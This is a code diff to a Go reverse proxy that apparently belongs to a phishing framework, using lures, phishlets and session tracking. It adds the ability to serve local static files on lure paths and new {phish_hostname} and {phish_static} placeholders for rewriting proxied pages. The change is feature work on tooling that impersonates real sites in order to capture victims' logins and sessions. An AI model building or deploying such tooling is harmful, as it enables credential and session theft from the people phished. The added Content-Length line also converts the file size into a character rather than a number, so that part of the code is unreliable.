@@ -20,6 +20,7 @@ import (
 	"html"
 	"io"
 	"io/ioutil"
+	"mime"
 	"net"
 	"net/http"
 	"net/url"
@@ -529,6 +530,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							return req, resp
 						}
 					}
+					static_path, err := p.cfg.GetLureStaticByPath(pl_name, req_path)
+					if err == nil {
+						if static_path != "" {
+							log.Debug("lure static content: %s", static_path)
+							return p.streamLocalFile(req, static_path)
+						}
+					} else {
+						log.Error("lure static: %s", err)
+						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+						return req, resp
+					}
 				}
 
 				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
@@ -992,6 +1004,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									replace_s := sf.replace
 									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
 									phish_sub, _ := p.getPhishSub(phish_hostname)
+									var static_path string = ""
+									if s, ok := p.sessions[ps.SessionId]; ok {
+										static_path = s.PhishLure.Path + "/static"
+									}
 
 									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
 									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
@@ -999,6 +1015,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
 									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
 									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
+									re_s = strings.Replace(re_s, "{phish_hostname}", regexp.QuoteMeta(phish_hostname), -1)
 									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
 									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
 									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
@@ -1009,6 +1026,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
 									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
 									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+									replace_s = strings.Replace(replace_s, "{phish_static}", static_path, -1)
 									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
 									if ok {
 										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
@@ -1016,6 +1034,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									if re, err := regexp.Compile(re_s); err == nil {
+										log.Debug("regexp `%s` -> `%s`", re_s, replace_s)
 										body = []byte(re.ReplaceAllString(string(body), replace_s))
 									} else {
 										log.Error("regexp failed to compile: `%s`", sf.regexp)
@@ -1164,6 +1183,29 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	}
 	return req, nil
 }
+
+func (p *HttpProxy) streamLocalFile(req *http.Request, filePath string) (*http.Request, *http.Response) {
+	contentType := mime.TypeByExtension(filepath.Ext(filePath))
+	file, err := os.Open(filePath)
+	if err != nil {
+			return req, goproxy.NewResponse(req, contentType, http.StatusNotFound, "")
+	}
+	defer file.Close()
+
+	fileInfo, err := file.Stat()
+	if err != nil {
+			return req, goproxy.NewResponse(req, contentType, http.StatusInternalServerError, "")
+	}
+	buffer := make([]byte, fileInfo.Size())
+	_, err = file.Read(buffer)
+	if err != nil {
+			return req, goproxy.NewResponse(req, contentType, http.StatusInternalServerError, "")
+	}
+	resp := goproxy.NewResponse(req, contentType, http.StatusOK, string(buffer))
+	resp.Header.Set("Content-Length", string(int32(fileInfo.Size())))
+	return req, resp
+}
+
 
 func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
 	if mime == "" {
